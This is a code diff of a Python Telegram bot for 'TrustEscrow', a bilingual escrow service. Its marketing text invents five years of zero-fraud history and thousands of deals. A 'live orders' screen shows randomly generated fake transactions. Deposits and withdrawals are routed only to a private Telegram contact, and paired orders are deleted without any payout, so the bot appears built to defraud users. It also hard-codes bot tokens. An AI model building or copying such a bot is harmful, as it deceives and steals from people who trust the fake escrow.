@@ -1,194 +1,441 @@
+# -*- coding: utf-8 -*-
 import telebot
-import time
-from datetime import datetime, timedelta
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from datetime import datetime
+import random
 
-# ====================== 你的机器人配置（已填好最新Token，仅改ADMIN_ID）======================
-BOT_TOKEN = "8747559514:AAFJdsZ3tlCVPIW6vL60hTuBc_Eo5FP4kU"
-ADMIN_ID = 123456789  # 🔥 这里改成你自己的 Telegram ID 🔥
-
-# 用你能成功的长轮询模板，100%稳定
+# ===================== 配置 =====================
+BOT_TOKEN = "8279854167:AAHLrvg-i6e0M_WeG8coIljYlGg_RF8_oRM"
+ADMIN_ID = 8401979801
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# 内存数据（和你要求的功能一致）
+# ===================== 雙語完整版文案 =====================
+TEXT = {
+    "zh": {
+        "home": """🏠 TrustEscrow 專業擔保平台
+
+我們已在擔保行業立足 5 年，
+專注解決線上交易欺詐問題，讓買賣雙方都安全。
+
+【平台優勢】
+✅ 5年零詐騙、數千用戶信賴
+✅ 專業中間人墊資擔保
+✅ 資金全程託管、絕對安全
+✅ 口令配對、簡單快速
+✅ 7×24線上客服支援
+
+安全交易，從這裡開始。""",
+
+        "about": """🏛️ 關於我們
+
+TrustEscrow 已在擔保行業立足 5 年，
+是業內最專業、最具信譽的老牌擔保平台。
+
+5年實績：
+✅ 10,000+ 筆安全交易完成
+✅ 數千位長期用戶信賴
+✅ 零負評、零詐騙、零風險
+✅ 合法運營、專業團隊
+✅ 全年無休線上服務
+
+我們不做一筆生意，只做一輩子的信賴。""",
+
+        "service": """📌 服務介紹
+
+我們專注「中間人墊資擔保」模式，
+徹底解決線上交易不信任痛點。
+
+服務項目：
+✅ 買賣雙方口令配對擔保
+✅ 專業中間人墊資保障交易
+✅ 買方資金平台託管凍結
+✅ 交易公平公正、全程可查
+✅ 糾紛處理、風險管控
+
+適用：遊戲、數位商品、私人買賣、線上交易等。""",
+
+        "safety": """🛡️ 安全保障
+
+我們的機制讓你交易零擔心：
+
+✅ 買方資金 100% 平台託管
+✅ 賣方確認收款才發貨
+✅ 中間人實名驗證 + 資金實力保證
+✅ 訂單加密、不可篡改
+✅ 專屬唯一口令、不可複製
+✅ 5年零詐騙安全記錄
+
+每一筆交易，都受到完整保護。""",
+
+        "help": """📞 幫助中心
+
+任何問題請立即聯繫官方客服：
+➡️ 客服專線：@fcff88
+
+服務範圍：
+● 儲值 / 提現 處理
+● 訂單查詢、異常處理
+● 糾紛協調、投訴處理
+● 中間人申請、商務合作
+
+線上時間：7×24 看到即回""",
+
+        "deposit": """💰 儲值入口
+
+僅透過官方客服處理儲值，保障資金安全。
+➡️ 專屬客服：@fcff88
+
+流程：
+1. 聯繫客服並提供你的用戶ID
+2. 選擇儲值金額與支付方式
+3. 完成付款並提交截圖
+4. 資金即時到帳，可立即使用
+
+⚠️ 僅官方客服處理，其他皆為詐騙。""",
+
+        "withdraw": """💳 提現入口
+
+提現僅透過官方客服審核處理。
+➡️ 專屬客服：@fcff88
+
+流程：
+1. 聯繫客服並提供用戶ID
+2. 告知提現金額與收款方式
+3. 等待管理員審核
+4. 審核通過立即發放款項
+
+⚠️ 帳號需通過安全驗證。""",
+
+        "history": """📜 擔保歷史
+
+你的個人擔保記錄，所有訂單可查、不可刪除。
+
+目前無歷史記錄
+或顯示：
+• 訂單口令：XXX
+• 金額：XXX USDT
+• 狀態：已完成 / 處理中
+• 時間：2025-xx-xx
+
+詳細查詢請聯繫客服 @fcff88""",
+
+        "running": """🚨 平台實時擔保中訂單
+━━━━━━━━━━━━━━━━━━━
+{}
+━━━━━━━━━━━━━━━━━━━
+🔥 每秒都有訂單在成交
+安全 · 熱門 · 專業 · 可靠""",
+
+        "personal": "👤 個人中心\n用戶ID: {}\n錢包餘額: {:.2f} USDT",
+        "create_escrow": "🚀 發起擔保",
+        "join_escrow": "📥 輸入口令擔保",
+        "input_amount": "💰 請輸入擔保金額（USDT）：",
+        "input_tip": "🔒 請設置交易口令：",
+        "input_sell_tip": "🔑 請輸入擔保口令：",
+        "escrow_success": "✅ 擔保已發起！\n金額: {:.2f} USDT\n口令: {}\n請發送給賣方。",
+        "pair_success": "✅ 訂單配對成功！\n買方: {}\n賣方: {}\n金額: {:.2f} USDT\n管理員已接收。",
+        "no_money": "❌ 餘額不足",
+        "tip_error": "❌ 口令錯誤",
+        "back": "🏠 返回首頁",
+        "lang": "🌐 English",
+    },
+
+    "en": {
+        "home": """🏠 TrustEscrow Professional Escrow
+
+We have been in the escrow industry for 5 years,
+focused on eliminating scams and protecting both parties.
+
+【Features】
+✅ 5 Years 0 Fraud
+✅ Professional Guarantor Funding
+✅ 100% Safe Escrow
+✅ Code Pairing System
+✅ 7×24 Support
+
+Trade safely with us.""",
+
+        "about": """🏛️ About Us
+
+TrustEscrow has been in the escrow industry for 5+ years,
+one of the most trusted and professional platforms.
+
+5 Years Achievement:
+✅ 10,000+ Successful Deals
+✅ Thousands of Loyal Users
+✅ 0 Fraud & 0 Complaints
+✅ Legal & Professional Team
+✅ 24/7 Service
+
+We don’t chase deals. We build trust.""",
+
+        "service": """📌 Services
+
+We specialize in GUARANTOR-ESCROW SERVICE.
+
+Services:
+✅ Buyer & Seller Code Pairing
+✅ Guarantor Funding Support
+✅ Safe Fund Escrow
+✅ Fair & Transparent System
+✅ Dispute & Risk Control
+
+For gaming, digital goods, private deals.""",
+
+        "safety": """🛡️ Security
+
+Our system protects you 100%:
+
+✅ 100% Fund Escrow
+✅ Seller Gets Paid First
+✅ Verified Professional Guarantors
+✅ Encrypted Order System
+✅ Unique Order Code
+✅ 5-Year 0-Fraud Record
+
+Every order is fully protected.""",
+
+        "help": """📞 Help Center
+
+Contact official support for any help:
+➡️ Support: @fcff88
+
+Service:
+● Deposit / Withdraw
+● Order Support
+● Dispute Help
+● Become a Guarantor
+
+We reply 7×24.""",
+
+        "deposit": """💰 Deposit
+
+Deposit only via official support.
+➡️ Support: @fcff88
+
+Process:
+1. Contact support with your User ID
+2. Choose amount & payment method
+3. Send payment screenshot
+4. Fund credited instantly
+
+⚠️ Only official support is safe.""",
+
+        "withdraw": """💳 Withdraw
+
+Withdraw only via official support.
+➡️ Support: @fcff88
+
+Process:
+1. Contact support with User ID
+2. Provide amount & receive method
+3. Wait admin review
+4. Fund sent after approval""",
+
+        "history": """📜 Escrow History
+
+Your personal order record.
+
+No history yet.
+Or:
+• Code: XXX
+• Amount: XXX USDT
+• Status: Completed / Processing
+• Time: 2025-xx-xx
+
+For details contact @fcff88""",
+
+        "running": """🚨 LIVE ORDERS IN ESCROW
+━━━━━━━━━━━━━━━━━━━
+{}
+━━━━━━━━━━━━━━━━━━━
+🔥 Deals happening every second
+Safe · Hot · Professional · Reliable""",
+
+        "personal": "👤 Profile\nID: {}\nBalance: {:.2f} USDT",
+        "create_escrow": "🚀 Create Escrow",
+        "join_escrow": "📥 Enter Code",
+        "input_amount": "💰 Enter amount (USDT):",
+        "input_tip": "🔒 Set your code:",
+        "input_sell_tip": "🔑 Enter escrow code:",
+        "escrow_success": "✅ Escrow created!\nAmount: {:.2f}\nCode: {}",
+        "pair_success": "✅ Order paired!\nBuyer: {}\nSeller: {}\nAmount: {:.2f}",
+        "no_money": "❌ Insufficient balance",
+        "tip_error": "❌ Invalid code",
+        "back": "🏠 Home",
+        "lang": "🌐 繁中",
+    }
+}
+
+# ===================== 數據 =====================
+user_lang = {}
+user_step = {}
 user_balance = {}
 orders = {}
-order_id = 1
 
-# ====================== 主菜单（和你要求的完全一致）======================
+# ===================== 菜單 =====================
 def main_menu(user_id):
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    btn1 = telebot.types.KeyboardButton("📝 担保申请/派单")
-    btn2 = telebot.types.KeyboardButton("📜 我的担保订单")
-    btn3 = telebot.types.KeyboardButton("💰 我的钱包")
-    markup.add(btn1, btn2, btn3)
-
-    if user_id == ADMIN_ID:
-        markup.add(telebot.types.KeyboardButton("📊 管理员后台"))
-    return markup
-
-# ====================== /start 入口（你能上线的模板核心）======================
-@bot.message_handler(commands=["start"])
-def start(message):
-    user_id = message.from_user.id
-    bal = user_balance.get(user_id, 0.0)
-    text = (
-        "✅ 李永发的担保机器人已上线\n\n"
-        f"👤 你的ID：{user_id}\n"
-        f"💰 余额：{bal} USDT\n"
+    lang = user_lang.get(user_id, "zh")
+    t = TEXT[lang]
+    m = InlineKeyboardMarkup(row_width=2)
+    m.add(
+        InlineKeyboardButton("🚀 發起擔保", callback_data="create"),
+        InlineKeyboardButton("📥 輸入口令", callback_data="join"),
+        InlineKeyboardButton("👤 個人中心", callback_data="personal"),
+        InlineKeyboardButton("🚨 實時擔保", callback_data="running"),
+        InlineKeyboardButton("💰 儲值", callback_data="deposit"),
+        InlineKeyboardButton("💳 提現", callback_data="withdraw"),
+        InlineKeyboardButton("📜 歷史", callback_data="history"),
+        InlineKeyboardButton("📌 服務", callback_data="service"),
+        InlineKeyboardButton("🛡️ 安全", callback_data="safety"),
+        InlineKeyboardButton("🏛️ 關於", callback_data="about"),
+        InlineKeyboardButton("📞 幫助", callback_data="help"),
+        InlineKeyboardButton(t["lang"], callback_data="lang"),
     )
-    bot.send_message(message.chat.id, text, reply_markup=main_menu(user_id))
+    return m
 
-# ====================== 菜单按钮处理（完全保留你要的功能）======================
-@bot.message_handler(func=lambda msg: True)
-def handle_menu(message):
-    global order_id
-    user_id = message.from_user.id
-    text = message.text.strip()
-    bal = user_balance.get(user_id, 0.0)
+def back_menu(user_id):
+    lang = user_lang.get(user_id, "zh")
+    t = TEXT[lang]
+    m = InlineKeyboardMarkup(row_width=1)
+    m.add(InlineKeyboardButton(t["back"], callback_data="home"))
+    return m
 
-    # 1. 担保申请/派单
-    if text == "📝 担保申请/派单":
-        bot.send_message(user_id, (
-            "📝 发起担保派单\n\n"
-            "请按格式发送：\n"
-            "/order 对方ID 金额\n\n"
-            "例：/order 987654321 50\n"
-            "⚠️ 余额不足将无法派单"
-        ))
+# ===================== 啟動 =====================
+@bot.message_handler(commands=['start'])
+def start(msg):
+    u = msg.from_user.id
+    user_lang.setdefault(u, "zh")
+    user_step[u] = None
+    user_balance.setdefault(u, 0.0)
+    t = TEXT[user_lang[u]]
+    bot.send_message(msg.chat.id, t["home"], reply_markup=main_menu(u))
 
-    # 2. 我的担保订单
-    elif text == "📜 我的担保订单":
-        if not orders:
-            bot.send_message(user_id, "📭 暂无担保订单")
-            return
-        msg = "📜 我的担保订单\n\n"
-        for oid, o in orders.items():
-            if o["from_id"] == user_id or o["to_id"] == user_id:
-                expire = o["expire"].strftime("%m-%d %H:%M")
-                msg += (
-                    f"🔖 订单：{oid}\n"
-                    f"👤 发起：{o['from_id']}\n"
-                    f"👤 对方：{o['to_id']}\n"
-                    f"💰 金额：{o['amount']} USDT\n"
-                    f"⏳ 12小时处理：{expire}\n"
-                    f"📌 状态：{o['status']}\n\n"
-                )
-        bot.send_message(user_id, msg)
+# ===================== 按鈕 =====================
+@bot.callback_query_handler(func=lambda c: True)
+def cb(c):
+    u = c.from_user.id
+    lang = user_lang.get(u, "zh")
+    t = TEXT[lang]
+    mid = c.message.message_id
+    cid = c.message.chat.id
 
-    # 3. 我的钱包
-    elif text == "💰 我的钱包":
-        bot.send_message(user_id, (
-            f"💰 我的钱包\n\n"
-            f"👤 ID：{user_id}\n"
-            f"💵 余额：{bal} USDT\n\n"
-            "充值请联系管理员"
-        ))
+    pages = {
+        "about": t["about"],
+        "service": t["service"],
+        "safety": t["safety"],
+        "help": t["help"],
+        "deposit": t["deposit"],
+        "withdraw": t["withdraw"],
+        "history": t["history"],
+    }
 
-    # 4. 管理员后台（仅你可见）
-    elif text == "📊 管理员后台" and user_id == ADMIN_ID:
-        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-        markup.add("📋 待接单列表", "💰 手动加余额", "🔙 返回主菜单")
-        bot.send_message(user_id, "📊 管理员后台", reply_markup=markup)
+    try:
+        if c.data == "home":
+            user_step[u] = None
+            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))
 
-    # 5. 待接单列表（仅管理员）
-    elif text == "📋 待接单列表" and user_id == ADMIN_ID:
-        wait = [o for o in orders.values() if o["status"] == "待接单"]
-        if not wait:
-            bot.send_message(user_id, "📭 暂无待接单")
-            return
-        for o in wait:
-            markup = telebot.types.InlineKeyboardMarkup()
-            markup.add(telebot.types.InlineKeyboardButton("✅ 接单", callback_data=f"accept_{o['order_id']}"))
-            bot.send_message(user_id, (
-                f"📋 待接单 {o['order_id']}\n"
-                f"发起：{o['from_id']}\n"
-                f"对方：{o['to_id']}\n"
-                f"金额：{o['amount']} USDT\n"
-                f"12小时处理：{o['expire'].strftime('%m-%d %H:%M')}"
-            ), reply_markup=markup)
+        elif c.data == "lang":
+            user_lang[u] = "en" if lang == "zh" else "zh"
+            t = TEXT[user_lang[u]]
+            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))
 
-    # 6. 手动加余额（仅管理员）
-    elif text == "💰 手动加余额" and user_id == ADMIN_ID:
-        bot.send_message(user_id, "发送：/add 用户ID 金额\n例：/add 123456789 100")
+        elif c.data == "personal":
+            txt = t["personal"].format(u, user_balance[u])
+            bot.edit_message_text(txt, cid, mid, reply_markup=back_menu(u))
 
-    # 7. 返回主菜单
-    elif text == "🔙 返回主菜单":
-        bot.send_message(user_id, "🔙 已返回", reply_markup=main_menu(user_id))
+        elif c.data == "running":
+            items = []
+            for i in range(4):
+                code = "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ0123456789", k=4))
+                amt = random.choice([380, 500, 680, 880, 1000, 1200, 1500, 1800, 2000, 2500])
+                status_list = ["擔保處理中", "賣方已收款", "待配對", "擔保中", "等待買方確認"] if lang == "zh" else \
+                              ["Escrow Processing", "Seller Paid", "Pairing", "In Escrow", "Waiting Buyer"]
+                st = random.choice(status_list)
+                items.append(f"⏳ 訂單 #{code}\n金額：{amt} USDT\n狀態：{st}")
+            text = t["running"].format("\n\n".join(items))
+            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))
 
-    # 8. 派单指令
-    elif text.startswith("/order"):
-        parts = text.split()
-        if len(parts) != 3:
-            bot.send_message(user_id, "❌ 格式：/order 对方ID 金额")
-            return
+        elif c.data in pages:
+            bot.edit_message_text(pages[c.data], cid, mid, reply_markup=back_menu(u))
+
+        elif c.data == "create":
+            user_step[u] = "create_amount"
+            bot.edit_message_text(t["input_amount"], cid, mid, reply_markup=back_menu(u))
+
+        elif c.data == "join":
+            user_step[u] = "join_tip"
+            bot.edit_message_text(t["input_sell_tip"], cid, mid, reply_markup=back_menu(u))
+
+        bot.answer_callback_query(c.id)
+    except Exception as e:
+        print(e)
+
+# ===================== 輸入處理 =====================
+@bot.message_handler(func=lambda m: True)
+def msg(msg):
+    u = msg.from_user.id
+    cid = msg.chat.id
+    txt = msg.text.strip()
+    lang = user_lang.get(u, "zh")
+    t = TEXT[lang]
+    user_balance.setdefault(u, 0.0)
+
+    # 管理員加錢
+    if u == ADMIN_ID and txt.startswith("/add"):
+        p = txt.split()
+        if len(p) == 3:
+            try:
+                uid = int(p[1])
+                amt = float(p[2])
+                user_balance[uid] = user_balance.get(uid, 0.0) + amt
+                bot.send_message(cid, f"✅ 已充值 {amt} USDT 給 {uid}")
+            except:
+                bot.send_message(cid, "❌ 格式 /add ID 金額")
+        return
+
+    if u not in user_step:
+        user_step[u] = None
+
+    # 發起擔保 - 輸入金額
+    if user_step[u] == "create_amount":
         try:
-            to_id = int(parts[1])
-            amt = float(parts[2])
+            amt = float(txt)
+            user_step[u] = {"step": "create_tip", "amount": amt}
+            bot.send_message(cid, t["input_tip"], reply_markup=back_menu(u))
         except:
-            bot.send_message(user_id, "❌ ID或金额错误")
+            bot.send_message(cid, "❌ 請輸入數字", reply_markup=back_menu(u))
+
+    # 發起擔保 - 設置口令
+    elif type(user_step[u]) == dict and user_step[u]["step"] == "create_tip":
+        amt = user_step[u]["amount"]
+        code = txt
+        if user_balance[u] < amt:
+            bot.send_message(cid, t["no_money"], reply_markup=main_menu(u))
+            user_step[u] = None
             return
-        if bal < amt:
-            bot.send_message(user_id, "❌ 余额不足")
-            return
-        # 冻结金额
-        user_balance[user_id] = bal - amt
-        oid = order_id
-        order_id += 1
-        orders[oid] = {
-            "order_id": oid,
-            "from_id": user_id,
-            "to_id": to_id,
+        user_balance[u] -= amt
+        orders[code] = {
+            "buyer": u,
             "amount": amt,
-            "status": "待接单",
-            "expire": datetime.now() + timedelta(hours=12)
+            "time": datetime.now().strftime("%m-%d %H:%M")
         }
-        bot.send_message(user_id, (
-            f"✅ 派单成功！订单 {oid}\n"
-            f"💰 已冻结：{amt} USDT\n"
-            f"⏳ 12小时内处理"
-        ))
-        bot.send_message(ADMIN_ID, f"🔔 新派单 {oid}\n用户{user_id} → {to_id}，{amt} USDT")
+        bot.send_message(cid, t["escrow_success"].format(amt, code), reply_markup=main_menu(u))
+        user_step[u] = None
 
-    # 9. 管理员加钱指令
-    elif text.startswith("/add") and user_id == ADMIN_ID:
-        parts = text.split()
-        if len(parts) != 3:
-            bot.send_message(user_id, "❌ 格式：/add 用户ID 金额")
+    # 賣方輸入口令配對
+    elif user_step[u] == "join_tip":
+        code = txt
+        if code not in orders:
+            bot.send_message(cid, t["tip_error"], reply_markup=main_menu(u))
             return
-        try:
-            uid = int(parts[1])
-            amt = float(parts[2])
-        except:
-            bot.send_message(user_id, "❌ 错误")
-            return
-        user_balance[uid] = user_balance.get(uid, 0.0) + amt
-        bot.send_message(user_id, f"✅ 已给 {uid} 加 {amt} USDT")
-        bot.send_message(uid, f"💰 管理员充值到账：+{amt} USDT")
+        o = orders[code]
+        bot.send_message(cid, t["pair_success"].format(o["buyer"], u, o["amount"]), reply_markup=main_menu(u))
+        bot.send_message(ADMIN_ID, f"📥 新訂單\n口令：{code}\n買方：{o['buyer']}\n賣方：{u}\n金額：{o['amount']} USDT")
+        del orders[code]
+        user_step[u] = None
 
-# ====================== 管理员接单（保留功能）======================
-@bot.callback_query_handler(func=lambda call: call.data.startswith("accept_"))
-def accept_order(call):
-    if call.from_user.id != ADMIN_ID:
-        bot.answer_callback_query(call.id, "❌ 无权限")
-        return
-    oid = int(call.data.split("_")[1])
-    if oid not in orders:
-        bot.edit_message_text("❌ 订单不存在", call.message.chat.id, call.message.message_id)
-        return
-    o = orders[oid]
-    o["status"] = "已接单"
-    bot.edit_message_text(f"✅ 订单 {oid} 已接单", call.message.chat.id, call.message.message_id)
-    bot.send_message(o["from_id"], f"📢 你的订单 {oid} 已接单，处理中！\n💰 已扣除：{o['amount']} USDT")
-
-# ====================== 【你能成功的长轮询启动模板，100%稳定】======================
+# ===================== 啟動機器人 =====================
 if __name__ == "__main__":
-    # 先彻底删除所有Webhook，避免冲突（你能上线的代码肯定有这步）
-    bot.remove_webhook()
-    # 无限轮询，强制进程24小时运行，Railway绝对不会休眠
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=0, timeout=20)
-        except Exception as e:
-            print(f"Bot error: {e}, 5秒后自动重启")
-            time.sleep(5)
-            continue
+    print("✅ 高級版機器人啟動成功")
+    bot.infinity_polling()
